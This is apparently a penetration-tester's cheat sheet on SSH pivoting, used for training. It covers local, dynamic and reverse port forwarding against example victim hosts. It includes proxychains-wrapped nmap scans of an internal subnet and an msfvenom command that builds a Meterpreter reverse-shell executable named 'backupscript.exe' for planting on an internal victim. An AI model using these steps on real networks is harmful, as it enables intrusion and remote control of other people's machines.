# When to use what?
**Local(Forward):** when you want to access a port that is only available locally on a victim from your machine.
**Dynamic(Forward):** when you want to access a subnet that is only accessible from the victim, directly from your machine.
**Reverse(Forward):** when you want to send traffic to a remote(victim) port via your machine and that victim can speak back to you machine(attacker) directly cause it's only accessible from a pivot machine.  
***You(attacker) -- Pivot(Victim1) -- Victim 2***
Here we could speak to Victim1(Pivot) which can access to Victim2(only accessible from Victim1) and we want that Victim2 can respond back to You. Then you can use revshells as well.
P.S. The reverse is setup on the (Victim1)Pivot which can speak naturally to Victim2 and Victim1 can speak back to you. 


# Local(Forward) SSH
`ssh -L LPORT:localhost:RPORT USER@RHOST`

ex: `ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64 (on attacker)`
The -L command tells the SSH client to request the SSH server to forward all the data we send via the port 1234 to localhost:3306 on the Ubuntu server. 
By doing this, we should be able to access the MySQL service locally on port 1234. 
We can use Netstat or Nmap to query our local host on 1234 port to verify whether the MySQL service was forwarded.

# Local(Forward) Multiple SSH
```
ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64
```


# Dynamic Port(Forward) SSH
```
ssh -D LPORT USER@RHOST (on attacker)
```


ex: `ssh -D 9050 ubuntu@10.129.202.64(on attacker)`
The -D argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port 9050. 
We can do this using the tool proxychains, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. 
Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. 
Proxychains is often used to force an application's TCP traffic to go through hosted proxies like SOCKS4/SOCKS5, TOR, or HTTP/HTTPS proxies.

Add that to proxychains in  **/etc/proxychains.conf** (on attacker)
`socks5 127.0.0.1 9050`
Now send any command from Attacker to Victim to NAT subnet(visible only from Victim)
`proxychains nmap -v -Pn -sT VICTIM_IP`
ex: `proxychains nmap -v -Pn -sT 172.16.5.19`
Here example we are scanning subnet 172 which is open only from 10.129.202.64 directy from our machine.


# Reverse Port(Forward) SSH
```
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
(This will create a MSF shell to speak back to the Pivot)
Copy the msfshell to the pivot and then to the victim(accessible only from pivot)
```
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN 
```
(on the attacker)
The **-R** command asks the Ubuntu server to listen on `<targetIPaddress>:8080` and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host 
Lastly you should be able to see traffic into Meterpreter.